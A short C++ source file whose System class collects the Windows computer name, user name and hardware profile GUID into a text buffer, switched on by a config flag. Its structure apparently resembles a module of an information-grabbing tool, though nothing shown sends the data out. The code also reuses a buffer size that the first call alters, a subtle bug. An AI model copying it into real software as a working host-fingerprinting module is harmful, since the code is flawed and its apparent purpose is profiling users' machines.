#include <string>
#include <windows.h>

#include "config.h"

#include "system.h"

System::System() noexcept
{
	if (!config::system)
		return;

	this->GetSystemInfo();
}

void System::GetSystemInfo() noexcept
{
	char buffer[256];
	DWORD size = sizeof(buffer);
	HW_PROFILE_INFOA hwProfile = { 0 };


	if (GetComputerNameA(buffer, &size))
		this->data.append("SYSTEM NAME: " + std::string(buffer) + "\n");

	if(GetUserNameA(buffer, &size))
		this->data.append("USER: " + std::string(buffer) + "\n");

	if(GetCurrentHwProfileA(&hwProfile))
		this->data.append("HARDWARE PROFILE GUID: " + std::string(hwProfile.szHwProfileGuid) + "\n");
}